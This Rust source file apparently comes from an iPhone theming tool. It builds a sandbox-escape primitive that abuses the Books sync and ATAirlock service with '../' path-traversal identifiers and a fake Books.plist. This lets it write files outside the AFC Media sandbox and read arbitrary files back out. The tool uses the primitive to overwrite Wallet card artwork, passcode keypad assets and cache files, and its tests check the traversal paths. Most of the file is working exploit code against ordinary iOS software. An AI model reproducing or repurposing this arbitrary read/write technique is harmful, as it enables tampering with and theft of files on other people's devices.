//! The out-of-scope write primitive, and the card/theme flash operations built
//! on it.
//!
//! Ported from `reference/AirCard-Windows/src/flasher.rs`, with two changes:
//!
//! * every fixed `sleep` is replaced by **polling for real state**, because the
//!   Python spike proved fixed delays race (see `docs/airtraffic-protocol.md` §5.7)
//! * the Books snapshot/restore always runs, including on the error path

use std::time::{Duration, Instant};

use anyhow::{Context, Result, bail};
use idevice::provider::IdeviceProvider;

use crate::{
    afc::Afc,
    airlift::{
        LINK_PREFIX, RECOVERED_PREFIX, SOURCE_PREFIX, build_books_plist,
        build_streaming_zip_archive, build_streaming_zip_archive_multi, restore_books,
        snapshot_books,
    },
    services::{
        atc::{AtcClient, SyncRequest},
        streaming_zip::StreamingZipClient,
    },
    util::{random_hex, random_uuid_like},
};

/// ATAirlock's staging root. The device resolves `asset.identifier` relative to it.
pub const AIRLOCK_ROOT: &str = "/var/mobile/Media/Airlock/Book";

/// Where the device reads the list of assets it should fetch.
const BOOKS_SYNC_PLIST: &str = "/Books/Sync/Books.plist";

/// Wallet card artwork leaves that get replaced.
pub const TARGET_WALLET_ASSETS: &[&str] = &[
    "cardBackgroundCombined@3x.png",
    "cardBackgroundCombined@2x.png",
    "cardBackgroundCombined.pdf",
];

/// Cache leaves invalidated so the device re-renders from our artwork.
pub const CACHE_FILES: &[&str] = &["FrontFace", "PlaceHolder", "Preview"];

/// How long to wait for the device to act, and how often to look.
/// Generous: a card skin is several MB and the device performs one move per file.
const MOVE_TIMEOUT: Duration = Duration::from_secs(45);
const POLL_INTERVAL: Duration = Duration::from_millis(250);

/// Build the `..` traversal that escapes from `AIRLOCK_ROOT` to an absolute path.
///
/// E.g. `/var/tmp/x` becomes `../../../../../var/tmp/x` — five ups because
/// `AIRLOCK_ROOT` is five components deep, landing on `/`.
pub fn traversal_from_airlock(abs_path: &str) -> String {
    let depth = AIRLOCK_ROOT.trim_matches('/').split('/').count();
    format!(
        "{}{}",
        "../".repeat(depth),
        abs_path.trim_start_matches('/')
    )
}

/// Write one file outside the AFC Media sandbox.
pub async fn write_system_file<L: FnMut(&str)>(
    provider: &dyn IdeviceProvider,
    target_dir: &str,
    leaf: &str,
    payload: &[u8],
    log: &mut L,
) -> Result<()> {
    write_files(provider, target_dir, &[(leaf, payload)], log).await
}

/// Write several files into `target_dir` in a single sync round.
///
/// One staged archive carries every payload and one sync session reports them
/// all, so the device performs the whole set of moves together — which matters
/// for the card skin, where a partial write would leave a half-rendered card.
pub async fn write_files<L: FnMut(&str)>(
    provider: &dyn IdeviceProvider,
    target_dir: &str,
    items: &[(&str, &[u8])],
    log: &mut L,
) -> Result<()> {
    if items.is_empty() {
        return Ok(());
    }
    let single = items.len() == 1;

    let token = random_hex(20);
    let source = format!("{SOURCE_PREFIX}{token}");
    let link_dest = format!("{LINK_PREFIX}{token}");
    let link_ident = format!("../../{source}/p0/p1/p2/link");

    // Entry names must match what the archive builder emits.
    let payload_idents: Vec<String> = if single {
        vec![format!("../../{source}/payload")]
    } else {
        (0..items.len())
            .map(|idx| format!("../../{source}/payload_{idx}"))
            .collect()
    };

    // Media-relative paths we expect ATAirlock to move away.
    //
    // Careful: the multi-payload archive also carries an unreferenced `payload`
    // fallback entry, which is never reported in FileComplete and therefore
    // stays put. Watching for it would hang the poll forever — only track the
    // entries we actually declared.
    let mut expected_moved: Vec<String> = vec![format!("/{source}/p0/p1/p2/link")];
    expected_moved.extend(if single {
        vec![format!("/{source}/payload")]
    } else {
        (0..items.len())
            .map(|idx| format!("/{source}/payload_{idx}"))
            .collect()
    });

    log(&format!(
        "writing {} file(s) to {target_dir} (source={source})",
        items.len()
    ));

    let mut afc = Afc::connect(provider).await?;
    let snapshot = snapshot_books(&mut afc)
        .await
        .context("snapshotting Books state before staging")?;

    let attempt = async {
        let archive = if single {
            build_streaming_zip_archive(target_dir, items[0].1)?
        } else {
            build_streaming_zip_archive_multi(target_dir, items)?
        };

        let mut identifiers = vec![link_ident.clone()];
        identifiers.extend(payload_idents.iter().cloned());
        let books = build_books_plist(&identifiers)?;

        log(&format!("  staging archive of {} bytes", archive.len()));
        let mut zip = StreamingZipClient::open(provider).await?;
        let response = zip
            .stage(&source, &archive, Duration::from_secs(30))
            .await
            .context("streaming_zip_conduit staging failed")?;
        log(&format!("  conduit response: {response:?}"));

        for object in [
            source.clone(),
            format!("{source}/p0/p1/p2/link"),
            format!("{source}/payload"),
        ] {
            if !afc.exists(&format!("/{object}")).await {
                bail!("staging verification failed: /{object} missing in Media");
            }
        }
        log("  staged objects verified");

        afc.make_directory_recursive("/Books/Sync").await?;
        afc.write_file(BOOKS_SYNC_PLIST, &books).await?;
        log("  wrote fake Books/Sync/Books.plist");

        // (AssetID, AssetPath) for the symlink plus each payload.
        let mut completions: Vec<(String, String)> = vec![(link_ident.clone(), link_dest.clone())];
        for (idx, (leaf, _)) in items.iter().enumerate() {
            completions.push((
                payload_idents[idx].clone(),
                format!("{link_dest}/{leaf}"),
            ));
        }

        let atc_result = {
            let mut atc = AtcClient::open(provider).await?;
            let req = SyncRequest {
                library_id: random_uuid_like(),
                host_name: "aircard".to_string(),
                grappa_index: Some(0),
                completions: &completions,
            };
            atc.run_sync(&req, log).await?
        };

        for ident in &payload_idents {
            if !atc_result.manifest_asset_ids.iter().any(|id| id == ident) {
                bail!(
                    "device did not list our asset in AssetManifest: {ident} (got {:?})",
                    atc_result.manifest_asset_ids
                );
            }
        }
        log(&format!(
            "  reported {} asset(s) as downloaded",
            atc_result.completed
        ));

        // Poll for ATAirlock to perform the moves rather than sleeping blindly.
        let deadline = Instant::now() + MOVE_TIMEOUT;
        loop {
            let mut still_present = Vec::new();
            for path in &expected_moved {
                if afc.exists(path).await {
                    still_present.push(path.clone());
                }
            }
            if still_present.is_empty() {
                log(&format!(
                    "  ATAirlock moved all {} staged object(s)",
                    expected_moved.len()
                ));
                break;
            }
            if Instant::now() >= deadline {
                bail!(
                    "timed out waiting for ATAirlock; still staged: {}",
                    still_present.join(", ")
                );
            }
            tokio::time::sleep(POLL_INTERVAL).await;
        }
        Ok(())
    }
    .await;

    let _ = afc.remove_path(&format!("/{link_dest}")).await;
    let _ = afc.remove_tree(&format!("/{source}")).await;
    let restore_result = restore_books(&mut afc, &snapshot).await;

    attempt.context("write attempt failed")?;
    restore_result.context("restoring Books state failed")?;
    Ok(())
}

/// Pull a file that lives outside Media back into Media and read it.
///
/// This is the airlift "reads are indirect" trick (§5.7): declare a book whose
/// `Persistent ID` traverses back out to `abs_path`, then report it complete
/// with a plain Media destination — ATAirlock moves the file *into* Media,
/// where AFC can read it. Proves a write really landed, byte for byte.
pub async fn read_back_outside_file<L: FnMut(&str)>(
    provider: &dyn IdeviceProvider,
    abs_path: &str,
    log: &mut L,
) -> Result<Vec<u8>> {
    let identifier = traversal_from_airlock(abs_path);
    let recovered = format!("{RECOVERED_PREFIX}{}", random_hex(20));

    let mut afc = Afc::connect(provider).await?;
    let snapshot = snapshot_books(&mut afc).await?;

    let attempt = async {
        afc.write_file(
            BOOKS_SYNC_PLIST,
            &build_books_plist(&[identifier.clone()])?,
        )
        .await?;

        let completions = vec![(identifier.clone(), recovered.clone())];
        {
            let mut atc = AtcClient::open(provider).await?;
            let req = SyncRequest {
                library_id: random_uuid_like(),
                host_name: "aircard".to_string(),
                grappa_index: Some(0),
                completions: &completions,
            };
            atc.run_sync(&req, log).await?;
        }

        let path = format!("/{recovered}");
        let deadline = Instant::now() + MOVE_TIMEOUT;
        loop {
            if afc.exists(&path).await {
                return afc.read_file(&path).await;
            }
            if Instant::now() >= deadline {
                bail!("timed out waiting for the read-back file to appear in Media");
            }
            tokio::time::sleep(POLL_INTERVAL).await;
        }
    }
    .await;

    let _ = afc.remove_path(&format!("/{recovered}")).await;
    let _ = restore_books(&mut afc, &snapshot).await;
    attempt
}

/// Read a file that lives outside Media, then put it back where it was.
///
/// Same trick as [`read_back_outside_file`], but non-destructive: ATAirlock
/// *moves* the file into Media, so we immediately write the bytes back to the
/// original path. Use this to inspect or verify something that must survive —
/// a flashed card artwork, for instance.
pub async fn verify_outside_file<L: FnMut(&str)>(
    provider: &dyn IdeviceProvider,
    abs_path: &str,
    log: &mut L,
) -> Result<Vec<u8>> {
    let data = read_back_outside_file(provider, abs_path, log).await?;

    let (dir, leaf) = abs_path
        .rsplit_once('/')
        .context("path must be absolute and include a file name")?;
    log(&format!("  restoring {abs_path} ({} bytes)", data.len()));
    write_system_file(provider, dir, leaf, &data, log)
        .await
        .context("writing the verified file back to its original path")?;
    Ok(data)
}

/// Apply a card skin: the three artwork leaves, then invalidate the caches so
/// the device re-renders.
pub async fn flash_wallet_skin<F, L>(
    provider: &dyn IdeviceProvider,
    card_hash: &str,
    skin_png: &[u8],
    skin_pdf: &[u8],
    mut progress: F,
    log: &mut L,
) -> Result<()>
where
    F: FnMut(usize, usize, &str),
    L: FnMut(&str),
{
    let pkpass_dir = format!("/var/mobile/Library/Passes/Cards/{card_hash}.pkpass");

    progress(1, 3, "Writing card artwork assets...");
    log(&format!("target card: {card_hash}"));
    log(&format!(
        "payload: {} bytes PNG, {} bytes PDF",
        skin_png.len(),
        skin_pdf.len()
    ));

    let assets: Vec<(&str, &[u8])> = vec![
        (TARGET_WALLET_ASSETS[0], skin_png),
        (TARGET_WALLET_ASSETS[1], skin_png),
        (TARGET_WALLET_ASSETS[2], skin_pdf),
    ];
    write_files(provider, &pkpass_dir, &assets, log)
        .await
        .context("writing card artwork")?;

    // Cache invalidation is BEST-EFFORT, matching the reference implementation.
    // Which cache directories exist varies per card and iOS version — a card
    // with no `.pkcache` directory simply has nothing to invalidate, and the
    // move into the missing directory fails harmlessly. Only the artwork write
    // above is load-bearing.
    for (idx, ext) in [".cache", ".pkcache"].iter().enumerate() {
        let cache_dir = format!("/var/mobile/Library/Passes/Cards/{card_hash}{ext}");
        progress(
            2 + idx,
            3,
            &format!("Clearing {ext} so the card re-renders..."),
        );
        let leaves: Vec<(&str, &[u8])> =
            CACHE_FILES.iter().map(|leaf| (*leaf, b"corrupted".as_slice())).collect();
        if let Err(e) = write_files(provider, &cache_dir, &leaves, log).await {
            log(&format!(
                "  note: could not invalidate {ext} — continuing (best-effort). Reason: {e:#}"
            ));
        }
    }

    progress(3, 3, "Card skin applied");
    log("done — close and reopen Wallet on the iPhone to see the new card");
    Ok(())
}

/// Apply a passcode theme: every asset the theme declares, grouped by target
/// directory so each directory is one sync round.
pub async fn flash_passcode_theme<F, L>(
    provider: &dyn IdeviceProvider,
    items: &[(String, String, Vec<u8>)],
    mut progress: F,
    log: &mut L,
) -> Result<()>
where
    F: FnMut(usize, usize, &str),
    L: FnMut(&str),
{
    let mut by_dir: std::collections::BTreeMap<&str, Vec<(&str, &[u8])>> =
        std::collections::BTreeMap::new();
    for (dir, leaf, data) in items {
        by_dir
            .entry(dir.as_str())
            .or_default()
            .push((leaf.as_str(), data.as_slice()));
    }

    let total = by_dir.len();
    log(&format!(
        "applying passcode theme: {} asset(s) across {total} director(ies)",
        items.len()
    ));

    for (idx, (dir, group)) in by_dir.iter().enumerate() {
        let short = dir.rsplit('/').next().unwrap_or(dir);
        progress(
            idx + 1,
            total,
            &format!("Flashing {short} ({} assets)...", group.len()),
        );
        write_files(provider, dir, group, log)
            .await
            .with_context(|| format!("flashing {dir}"))?;
    }

    progress(total, total, "Passcode theme applied");
    log("done — lock the iPhone to see the new keypad");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn traversal_reaches_var_tmp() {
        assert_eq!(
            traversal_from_airlock("/var/tmp/x"),
            "../../../../../var/tmp/x"
        );
    }

    #[test]
    fn traversal_resolves_correctly() {
        let ident = traversal_from_airlock("/var/tmp/aircard.txt");
        let joined = format!("{AIRLOCK_ROOT}/{ident}");
        let mut parts: Vec<&str> = Vec::new();
        for c in joined.split('/') {
            match c {
                "" | "." => {}
                ".." => {
                    parts.pop();
                }
                other => parts.push(other),
            }
        }
        assert_eq!(format!("/{}", parts.join("/")), "/var/tmp/aircard.txt");
    }

    #[test]
    fn traversal_handles_deep_targets() {
        assert_eq!(
            traversal_from_airlock("/var/mobile/Library/SpringBoard/x.png"),
            "../../../../../var/mobile/Library/SpringBoard/x.png"
        );
    }
}
